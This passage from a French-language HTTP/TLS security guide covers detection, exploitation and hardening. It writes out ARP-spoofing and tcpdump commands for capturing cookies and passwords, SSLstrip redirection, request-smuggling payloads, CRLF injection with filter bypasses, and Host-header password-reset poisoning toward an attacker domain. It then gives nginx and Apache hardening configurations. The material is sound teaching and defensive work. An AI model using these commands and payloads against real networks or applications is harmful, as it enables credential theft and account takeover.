# - Set-Cookie: session=... sans HttpOnly/Secure → cookie vulnérable

# Requête OPTIONS pour découvrir les méthodes autorisées
curl -s -X OPTIONS https://cible.com/ -i | grep -i "allow:"
# Allow: GET, POST, OPTIONS    → méthodes autorisées
# Si TRACE ou DELETE présent → vecteur potentiel
```

### 4.4 Détection Blue Team

```text
Points de détection et de contrôle côté défense :

1. INSPECTION TLS EN LIGNE (SSL Inspection)
   ┌─────────┐   TLS 1.3 chiffré   ┌─────────────┐   TLS réchiffré   ┌────────┐
   │ Client  │ ──────────────────► │ Proxy SSL   │ ────────────────► │ Server │
   │         │ ◄────────────────── │ (intercept) │ ◄──────────────── │        │
   └─────────┘                     └─────────────┘                   └────────┘
                                         │
                                    Inspection DPI
                                    WAF, IDS, DLP
   Risque : introduit un point de compromission — le proxy voit TOUT le trafic déchiffré

2. LOGS WAF (Web Application Firewall)
   - Requêtes avec méthodes anormales (TRACE, CONNECT vers l'appli)
   - En-têtes suspects : X-Forwarded-For avec IPs internes, Host non attendu
   - Tentatives de Request Smuggling : Transfer-Encoding obfusqué
   - CRLF dans les paramètres : présence de %0d%0a / \r\n

3. CERTIFICATE TRANSPARENCY (CT) LOGS
   - Surveillance des nouveaux certificats émis pour son domaine
   - Détection de phishing via certificats similaires (example.com vs examp1e.com)
   - Outils : crt.sh, Facebook CT Monitor, Google Certificate Transparency

4. MÉTRIQUES SIEM / EDR
   - Pic de connexions TLS échouées → scan ou attaque de downgrade
   - Jitter de latence anormal → proxy MitM interceptant et réchiffrant
   - JA3 hashes inconnus dans les connexions internes → outil suspect
   - Changements de certificat non planifiés → potentielle substitution
```

---

## 5. Méthodologie d'exploitation & faiblesses courantes

### Variante 1 : Insecure Transport — HTTP en clair & MitM

**Scénario** : un utilisateur accède à une application via HTTP (non HTTPS) sur un réseau
partagé (Wi-Fi public, réseau d'entreprise non segmenté). Un attaquant positionné sur le même
réseau peut capturer et modifier le trafic.

```bash
# Étape 1 — ARP Spoofing : positionner l'attaquant comme passerelle par défaut de la victime
# (outil : arpspoof de dsniff ou Ettercap)
arpspoof -i eth0 -t 192.168.1.10 192.168.1.1  # Empoisonne la victime (.10) vers la passerelle (.1)
arpspoof -i eth0 -t 192.168.1.1  192.168.1.10 # Empoisonne la passerelle vers la victime

# Étape 2 — Activation du routage IP (pour relayer le trafic intercepté)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Étape 3 — Capture Wireshark / tcpdump sur le trafic HTTP
tcpdump -i eth0 -A -s 0 'host 192.168.1.10 and port 80' | \
    grep -E "Cookie:|Authorization:|password|session"
# → Tous les cookies, tokens et mots de passe transitent en clair
```

```bash
# SSLstrip : redirection HTTPS → HTTP via attaque de downgrade applicatif
# Interception du trafic avant que le navigateur ne charge HSTS
mitmproxy --mode transparent -p 8080
# ou
sslstrip -l 8080  # Remplace les liens https:// par http:// dans les réponses
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

!!! danger "Cookie sans flag `Secure` — extraction directe"
    ```http
    # Requête HTTP capturée par l'attaquant (texte brut, réseau Wi-Fi)
    GET /dashboard HTTP/1.1
    Host: app.example.com
    Cookie: session_id=8f3a7d2e9b1c4f5a; cart_total=350
    # ↑ session_id accessible à l'attaquant → Account Takeover immédiat
    ```

!!! tip "Protection : HSTS et cookies Secure"
    ```http
    # En-tête HSTS envoyé lors de la première connexion HTTPS
    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
    # Après réception de cet en-tête, le navigateur refusera TOUTE connexion HTTP
    # vers ce domaine (et ses sous-domaines) pendant 31 536 000 secondes (1 an)
    # Le preload permet l'inscription dans la liste HSTS préchargée des navigateurs
    ```

---

### Variante 2 : Attaques sur la négociation TLS/SSL — Downgrade

Ces attaques exploitent la phase de négociation de protocole pour forcer l'utilisation d'un
algorithme ou d'une version cryptographiquement faible.

```text
Chronologie des attaques majeures sur TLS/SSL :

POODLE (2014) — CVE-2014-3566
  Protocole ciblé : SSLv3 (CBC padding)
  Mécanisme : forcer un downgrade vers SSLv3, puis oracle sur le padding CBC
  → Déchiffrement de 1 octet de cookie par ~256 requêtes
  Correction : désactiver SSLv3 sur tous les serveurs

FREAK (2015) — CVE-2015-0204
  Protocole ciblé : TLS avec export-grade RSA (512 bits)
  Mécanisme : forcer la négociation d'une clé RSA de 512 bits (export US 1990s)
  → Factorisation de la clé en quelques heures sur CPU standard
  Correction : supprimer les ciphers RSA-EXPORT et DHE-EXPORT

LOGJAM (2015) — CVE-2015-4000
  Protocole ciblé : DHE avec paramètres de 512 bits
  Mécanisme : forcer un DHE-512, résoudre le logarithme discret avec PRECOMP
  → Même vulnérabilité de type que FREAK mais sur Diffie-Hellman
  Correction : paramètres DH ≥ 2048 bits, ou basculer sur ECDHE

BEAST (2011) — CVE-2011-3389
  Protocole ciblé : TLS 1.0 (CBC avec IV prévisible)
  Mécanisme : attaque chosen-plaintext sur le mode CBC de TLS 1.0
  Correction : désactiver TLS 1.0, utiliser RC4 (obsolète) ou TLS 1.1+

CRIME (2012) — CVE-2012-4929
  Protocole ciblé : TLS avec compression (DEFLATE)
  Mécanisme : oracle de compression — injection de texte connu, mesure de la taille
  → Déchiffrement du cookie de session caractère par caractère
  Correction : désactivation de la compression TLS (faite par défaut dans TLS 1.3)
```

```bash
# Test de vulnérabilité aux downgrade attacks (outil : testssl.sh)
./testssl.sh --protocols cible.com
# Résultats :
# SSLv2      not offered (OK)
# SSLv3      not offered (OK)
# TLS 1.0    not offered (OK)
# TLS 1.1    not offered (OK)
# TLS 1.2    offered (ATTENTION si seules des ciphers faibles)
# TLS 1.3    offered with final (OK)

./testssl.sh --vulnerable cible.com
# Teste POODLE, FREAK, LOGJAM, BEAST, CRIME, HEARTBLEED, etc.
```

!!! warning "Downgrade dance — TLS_FALLBACK_SCSV"
    Le mécanisme `TLS_FALLBACK_SCSV` (RFC 7507) prévient les downgrades en incluant une
    pseudo-suite de chiffrement dans le ClientHello lorsque le client tente une connexion en
    version réduite (après un premier échec). Si le serveur supporte une version supérieure,
    il **rejette** la connexion avec une alerte `inappropriate_fallback`. **Vérifier que ce
    mécanisme est actif** avant de conclure qu'un downgrade est impossible.

---

### Variante 3 : HTTP Request Smuggling (Désynchronisation HTTP)

Le Request Smuggling exploite les **divergences d'interprétation** des en-têtes `Content-Length`
(CL) et `Transfer-Encoding` (TE) entre un frontend (reverse proxy) et un backend, permettant
à un attaquant de "glisser" une requête parasite dans la connexion TCP partagée.

```text
Architecture typique vulnérable :

 Internet
    │
    ▼
┌──────────┐  TCP persistant  ┌──────────┐
│ Reverse  │ ───────────────► │ Backend  │
│  Proxy   │                  │  App     │
│ (nginx,  │ ◄─────────────── │ (Node,   │
│  HAProxy)│                  │  Flask...)│
└──────────┘                  └──────────┘

Problème : le proxy et le backend ne s'accordent pas sur OÙ se termine une requête
```

**CL.TE — Frontend lit Content-Length, Backend lit Transfer-Encoding :**

```http
POST / HTTP/1.1
Host: cible.com
Content-Length: 13
Transfer-Encoding: chunked

0\r\n
\r\n
SMUGGLED
```

```text
Interprétation par le Frontend (lit Content-Length: 13) :
  Corps = "0\r\n\r\nSMUGGLED" ← 13 octets, requête transmise intégralement au backend

Interprétation par le Backend (lit Transfer-Encoding: chunked) :
  Premier chunk : "0" → chunk de taille 0 = fin du message
  → La requête est : POST / HTTP/1.1... [corps vide]
  → "SMUGGLED" reste dans le buffer TCP et sera préfixé à la PROCHAINE requête
     d'un autre utilisateur

→ La prochaine requête d'un utilisateur innocent sera préfixée par "SMUGGLED",
  modifiant potentiellement sa méthode, ses en-têtes, ou son destination
```

**TE.CL — Frontend lit Transfer-Encoding, Backend lit Content-Length :**

```http
POST / HTTP/1.1
Host: cible.com
Content-Length: 3
Transfer-Encoding: chunked

8\r\n
SMUGGLED\r\n
0\r\n
\r\n
```

```text
Interprétation par le Frontend (lit TE: chunked) :
  Chunk 1 : 8 octets = "SMUGGLED"
  Chunk 2 : 0 = fin
  Requête complète transmise au backend

Interprétation par le Backend (lit Content-Length: 3) :
  Corps = "8\r\n" (3 octets)
  → "SMUGGLED\r\n0\r\n\r\n" reste en buffer — préfixe la prochaine requête
```

**H2.CL — HTTP/2 → HTTP/1.1 Desync (variante moderne) :**

```http
# Requête envoyée au frontend en HTTP/2
:method POST
:path /
:authority cible.com
content-length: 0

GET /admin HTTP/1.1
Host: cible.com
Content-Length: 10

x=1
```

```text
Le frontend HTTP/2 traduit en HTTP/1.1 vers le backend et injecte un Content-Length
arbitraire dans la requête traduite, créant une désynchronisation exploitable.
Les attaques H2.CL permettent souvent de contourner des contrôles d'accès (atteindre
/admin depuis une IP non autorisée via un "request tunnel").
```

```python
# Détection de Request Smuggling — exemple avec requests-smuggler (outil Python)
# Test CL.TE basique
import requests
from requests.models import PreparedRequest

# Construction d'une requête CL.TE de sonde
session = requests.Session()
req = PreparedRequest()
req.method = "POST"
req.url = "https://cible.com/"
req.headers = {
    "Host": "cible.com",
    "Content-Type": "application/x-www-form-urlencoded",
    "Content-Length": "6",
    "Transfer-Encoding": "chunked",
}
# "0\r\n\r\nX" = 6 octets (CL vue par le frontend)
req.body = b"0\r\n\r\nX"

resp = session.send(req, timeout=10)
# Observer un délai de réponse anormal ou une erreur 400 du backend →
# indicateur que la sonde a atteint le buffer du backend
```

!!! tip "Détection et remédiation du Request Smuggling"
    - **Normaliser** `Transfer-Encoding` et `Content-Length` au niveau du reverse proxy —
      si les deux sont présents, rejeter la requête avec `400 Bad Request`.
    - **Utiliser HTTP/2 de bout en bout** (frontend et backend) — HTTP/2 résout
      intrinsèquement le problème car il n'y a pas d'ambiguïté CL/TE.
    - **Activer la journalisation** des requêtes malformées au niveau WAF pour détecter
      les sondes de Request Smuggling.

---

### Variante 4 : Exploitation des en-têtes — Injection

#### 4.a CRLF Injection

La séquence `\r\n` (Carriage Return + Line Feed, encodée `%0d%0a`) est le délimiteur de
champ dans le protocole HTTP. Son injection dans un paramètre reflété dans les en-têtes de
réponse permet l'injection d'en-têtes arbitraires ou le fractionnement de réponse.

```http
# Requête vulnérable — le paramètre "location" est reflété dans l'en-tête Location
GET /redirect?url=https://example.com%0d%0aSet-Cookie:%20session=hijacked%3b%20HttpOnly HTTP/1.1
Host: cible.com
```

```http
# Réponse générée par le serveur vulnérable
HTTP/1.1 302 Found
Location: https://example.com
Set-Cookie: session=hijacked; HttpOnly   ← EN-TÊTE INJECTÉ par l'attaquant
Content-Length: 0
```

```text
Impact de la CRLF Injection :
  - Injection de cookies arbitraires (fixation de session)
  - Injection de réponse complète (HTTP Response Splitting)
  - XSS via injection de Content-Type ou body HTML
  - Contournement de CSP en injectant une politique permissive
  - Phishing via injection de corps de réponse

Contournement de filtres courants :
  %0d%0a  → \r\n   (encodage URL standard)
  %0D%0A  → même chose (majuscules)
  %E5%98%8A%E5%98%8D → séquence UTF-8 multi-octets décodée en \r\n par certains parseurs
  \r\n    → insertion directe si l'encodage URL n'est pas appliqué
```

#### 4.b Host Header Injection

```http
# Requête forgée — l'en-tête Host est contrôlé par l'attaquant
POST /api/v1/password/reset HTTP/1.1
Host: evil-attacker.com
Content-Type: application/json

{"email": "victim@example.com"}
```

```text
Impact si le backend construit le lien de reset depuis l'en-tête Host :
  Le serveur envoie à victim@example.com un email contenant :
  "Cliquez ici : https://evil-attacker.com/reset?token=SECRET_TOKEN"

  La victime clique → le token de réinitialisation est transmis au serveur de l'attaquant
  → Account Takeover complet

Variantes :
  X-Forwarded-Host: evil-attacker.com   ← Peut être utilisé à la place de Host
  X-Host: evil-attacker.com
  X-Original-URL: evil-attacker.com
  X-Rewrite-URL: evil-attacker.com
```

```bash
# Test automatisé de Host Header Injection (dans Burp : option "Host injection")
curl -s -X POST https://cible.com/forgot-password \
     -H "Host: attacker.com" \
     -H "Content-Type: application/json" \
     -d '{"email":"test@example.com"}' -i
# Observer si la réponse ou les emails contiennent une référence à "attacker.com"
```

#### 4.c Bypass de contrôle d'accès via X-Forwarded-For

```http
# Certaines applications restreignent l'accès à des routes d'administration
# aux seules adresses IP internes (127.0.0.1, 10.0.0.0/8...)
# Si elles lisent l'IP depuis X-Forwarded-For plutôt que l'IP TCP réelle :

GET /admin/panel HTTP/1.1
Host: cible.com
X-Forwarded-For: 127.0.0.1    ← IP interne fictive — contrôle d'accès bypassé
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

!!! warning "X-Forwarded-For n'est pas une source d'IP de confiance"
    `X-Forwarded-For` peut être forgé par n'importe quel client. Il n'est fiable
    que s'il est **ajouté ou restreint par un proxy de confiance connu**. Pour les
    contrôles d'accès basés sur l'IP, toujours utiliser l'**adresse IP de la connexion
    TCP** (socket source), jamais un en-tête HTTP. Si un reverse proxy est devant le
    serveur, configurer ce dernier pour n'accepter `X-Forwarded-For` que depuis l'IP
    du proxy de confiance.

---

## 6. Remédiation & Hardening

### 6.1 En-têtes de sécurité HTTP obligatoires

```http
# Configuration complète des en-têtes de sécurité recommandés (2026)

# Force HTTPS pour un an, tous sous-domaines inclus, préchargé dans les navigateurs
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

# Politique de sécurité du contenu — prévient XSS et injection de ressources
Content-Security-Policy: default-src 'self'; \
  script-src 'self' https://cdn.trusted.com; \
  style-src 'self' 'unsafe-inline'; \
  img-src 'self' data: https:; \
  font-src 'self' https://fonts.gstatic.com; \
  connect-src 'self' https://api.example.com; \
  frame-ancestors 'none'; \
  base-uri 'self'; \
  form-action 'self'; \
  upgrade-insecure-requests

# Interdit le chargement de la page dans un iframe (anti-clickjacking)
X-Frame-Options: DENY
# Note : remplacé par CSP frame-ancestors, mais maintenir les deux pour compat.

# Interdit le MIME type sniffing par le navigateur (anti-MIME confusion)
X-Content-Type-Options: nosniff

# Contrôle l'en-tête Referer envoyé lors des navigations inter-domaines
Referrer-Policy: strict-origin-when-cross-origin
# Options : no-referrer | no-referrer-when-downgrade | strict-origin | strict-origin-when-cross-origin

# Désactive les fonctionnalités navigateur non nécessaires
Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=(), usb=()

# Activation CORS stricte (uniquement si API publique)
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Authorization, Content-Type, X-Requested-With
Access-Control-Max-Age: 3600

# Désactivation de l'en-tête Server (supprime la fingerprint du serveur)
Server: (à supprimer ou remplacer par une valeur générique)
```

!!! tip "Tester sa politique CSP"
    Utiliser [report-uri.com](https://report-uri.com) ou [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com)
    pour évaluer la robustesse d'une politique CSP. Une directive `script-src 'unsafe-inline'`
    ou `script-src *` rend la CSP quasi-inefficace contre XSS.

### 6.2 Hardening TLS — Configuration nginx

```nginx
# /etc/nginx/conf.d/ssl-hardening.conf — Configuration TLS durcie (2026)

server {
    listen 443 ssl http2;
    server_name api.example.com;

    # ── Certificats ──────────────────────────────────────────────────────────
    ssl_certificate     /etc/ssl/certs/api.example.com.fullchain.pem;
    ssl_certificate_key /etc/ssl/private/api.example.com.key;

    # ── Protocoles — TLS 1.2 minimum, TLS 1.3 recommandé ───────────────────
    ssl_protocols TLSv1.2 TLSv1.3;

    # ── Suites de chiffrement ────────────────────────────────────────────────
    # TLS 1.3 : suites automatiquement gérées par OpenSSL (AES-GCM, ChaCha20)
    # TLS 1.2 : uniquement ECDHE + AEAD
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:\
                ECDHE-RSA-AES128-GCM-SHA256:\
                ECDHE-ECDSA-AES256-GCM-SHA384:\
                ECDHE-RSA-AES256-GCM-SHA384:\
                ECDHE-ECDSA-CHACHA20-POLY1305:\
                ECDHE-RSA-CHACHA20-POLY1305:\
                DHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;  # TLS 1.3 : laisser le client choisir

    # ── Sessions TLS ─────────────────────────────────────────────────────────
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:10m;  # ~40 000 sessions
    ssl_session_tickets off;           # Désactiver si PFS stricte requise

    # ── OCSP Stapling ────────────────────────────────────────────────────────
    ssl_stapling on;
    ssl_stapling_verify on;
    ssl_trusted_certificate /etc/ssl/certs/intermediate-chain.pem;
    resolver 1.1.1.1 8.8.8.8 valid=300s;
    resolver_timeout 5s;

    # ── Courbes elliptiques ──────────────────────────────────────────────────
    ssl_ecdh_curve X25519:secp384r1:secp256r1;

    # ── Paramètres DH (pour DHE en TLS 1.2) ─────────────────────────────────
    ssl_dhparam /etc/ssl/dhparam-4096.pem;  # openssl dhparam -out dhparam-4096.pem 4096

    # ── En-têtes de sécurité ─────────────────────────────────────────────────
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Content-Security-Policy "default-src 'self'" always;
    add_header Permissions-Policy "geolocation=(), camera=()" always;

    # ── Suppression des informations de version ──────────────────────────────
    server_tokens off;  # Masque "nginx/1.26.0" dans les en-têtes et pages d'erreur

    # ── Désactivation de TRACE ───────────────────────────────────────────────
    # Nginx ne supporte pas TRACE nativement, mais sécuriser par précaution :
    if ($request_method = TRACE) { return 405; }

    # ── Protection contre le Request Smuggling ───────────────────────────────
    # Rejeter les requêtes avec Transfer-Encoding et Content-Length simultanés
    # (configurer selon les capacités du module nginx utilisé)
}

# Redirection HTTP → HTTPS (avec suppression de tous les cookies non-Secure)
server {
    listen 80;
    server_name api.example.com;
    return 301 https://$host$request_uri;
}
```

### 6.3 Hardening TLS — Configuration Apache

```apache
# /etc/apache2/sites-enabled/api.example.com.conf

<VirtualHost *:443>
    ServerName api.example.com

    # ── Certificats ──────────────────────────────────────────────────────────
    SSLCertificateFile    /etc/ssl/certs/api.example.com.crt
    SSLCertificateKeyFile /etc/ssl/private/api.example.com.key
    SSLCertificateChainFile /etc/ssl/certs/intermediate.crt

    # ── Moteur SSL et protocoles ─────────────────────────────────────────────
    SSLEngine on
    SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1  # TLS 1.2+ uniquement

    # ── Suites de chiffrement ────────────────────────────────────────────────
    SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:\
                   ECDHE-RSA-AES128-GCM-SHA256:\
                   ECDHE-ECDSA-AES256-GCM-SHA384:\
                   ECDHE-RSA-AES256-GCM-SHA384:\
                   ECDHE-ECDSA-CHACHA20-POLY1305:\
                   ECDHE-RSA-CHACHA20-POLY1305
    SSLHonorCipherOrder off

    # ── OCSP Stapling ────────────────────────────────────────────────────────
    SSLUseStapling on
    SSLStaplingCache "shmcb:/var/run/ocsp(128000)"

    # ── Désactivation de TRACE ───────────────────────────────────────────────
    TraceEnable off

    # ── En-têtes de sécurité ─────────────────────────────────────────────────
    Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
    Header always set X-Frame-Options "DENY"
    Header always set X-Content-Type-Options "nosniff"
    Header always set Referrer-Policy "strict-origin-when-cross-origin"
    Header always set Content-Security-Policy "default-src 'self'"

    # ── Suppression des tokens de version ────────────────────────────────────
    ServerTokens Prod       # "Apache" uniquement, sans version
    ServerSignature Off     # Pas de signature dans les pages d'erreur
</VirtualHost>

<VirtualHost *:80>
    ServerName api.example.com
    Redirect permanent / https://api.example.com/
</VirtualHost>
```

### 6.4 Checklist de validation

!!! tip "Checklist de hardening HTTP/HTTPS"
    **Protocoles et Chiffrement :**
    - [ ] SSLv2, SSLv3, TLS 1.0, TLS 1.1 désactivés
    - [ ] TLS 1.2 et TLS 1.3 activés uniquement
    - [ ] Suites de chiffrement AEAD uniquement (AES-GCM, ChaCha20-Poly1305)
    - [ ] ECDHE utilisé pour l'échange de clés (PFS garantie)
    - [ ] Paramètres DH ≥ 2048 bits (ou ECDHE exclusif)
    - [ ] OCSP Stapling activé et fonctionnel
    - [ ] Certificat valide, non expiré, chaîne complète fournie

    **En-têtes de sécurité :**
    - [ ] `Strict-Transport-Security` avec `includeSubDomains` et `preload`
    - [ ] `Content-Security-Policy` définie et testée
    - [ ] `X-Frame-Options: DENY` ou `frame-ancestors 'none'` dans CSP
    - [ ] `X-Content-Type-Options: nosniff`
    - [ ] `Referrer-Policy` configurée
    - [ ] `Permissions-Policy` restrictive

    **Cookies :**
    - [ ] Tous les cookies de session avec `HttpOnly` + `Secure` + `SameSite=Strict`
    - [ ] Préfixes `__Host-` ou `__Secure-` sur les cookies critiques

    **Serveur et Application :**
    - [ ] `TraceEnable off` / méthode TRACE bloquée
    - [ ] En-têtes `Server:` et `X-Powered-By:` supprimés ou anonymisés
    - [ ] Domaine de base utilisé pour les liens d'email (jamais depuis `Host` header)
    - [ ] `X-Forwarded-For` non utilisé pour contrôles d'accès IP
    - [ ] Request Smuggling : normalisation CL/TE au niveau reverse proxy
    - [ ] Score SSL Labs ≥ A+

---

## 7. Références & Cheat Sheets

### RFCs fondamentaux

| RFC | Titre | Sujet |
|---|---|---|
| **RFC 9110** (2022) | HTTP Semantics | Méthodes, codes de statut, en-têtes, cache |
| **RFC 9111** (2022) | HTTP Caching | Directives de cache, Cache-Control |
| **RFC 9112** (2022) | HTTP/1.1 | Syntaxe de message HTTP/1.1 |
| **RFC 7540** (2015) | HTTP/2 | Framing binaire, multiplexage, HPACK |
| **RFC 9114** (2022) | HTTP/3 | HTTP sur QUIC |
| **RFC 9000** (2021) | QUIC | Protocole de transport QUIC |
| **RFC 8446** (2018) | TLS 1.3 | Handshake TLS 1.3, cipher suites, 0-RTT |
| **RFC 5246** (2008) | TLS 1.2 | Référence TLS 1.2 (obsolète en production) |
| **RFC 7507** (2015) | TLS Fallback SCSV | Protection contre les downgrades forcés |
| **RFC 6797** (2012) | HSTS | HTTP Strict Transport Security |
| **RFC 6962** (2013) | CT Logs | Certificate Transparency |
| **RFC 4648** (2006) | Base64 | Encodage Base64 (Basic Auth) |

### Ressources pratiques

| Ressource | Contenu | URL |
|---|---|---|
| **SSL Labs — Test SSL** | Analyse complète TLS d'un serveur avec note A à F | https://www.ssllabs.com/ssltest/ |
| **SSL Labs — Best Practices** | Configuration TLS recommandée, suites de chiffrement | https://github.com/ssllabs/research/wiki |
| **OWASP TLS Cheat Sheet** | Transport Layer Security best practices | https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html |
| **OWASP HTTP Headers Cheat Sheet** | En-têtes de sécurité — référence complète | https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html |
| **OWASP Request Smuggling** | Technique, détection et remédiation | https://owasp.org/www-community/attacks/HTTP_Request_Smuggling |
| **PortSwigger — Request Smuggling** | Labs interactifs, variantes CL.TE / TE.CL / H2 | https://portswigger.net/web-security/request-smuggling |
| **testssl.sh** | Script d'audit TLS complet en ligne de commande | https://testssl.sh |
| **Mozilla SSL Config Generator** | Génération de config nginx/Apache/HAProxy sécurisée | https://ssl-config.mozilla.org |
| **securityheaders.com** | Analyse des en-têtes de sécurité HTTP d'un site | https://securityheaders.com |
| **crt.sh** | Recherche dans les Certificate Transparency logs | https://crt.sh |
| **JA3 / JA4 Reference** | Fingerprints TLS connus par outil et version | https://github.com/salesforce/ja3 |
| **HSTS Preload List** | Soumission pour le préchargement HSTS | https://hstspreload.org |
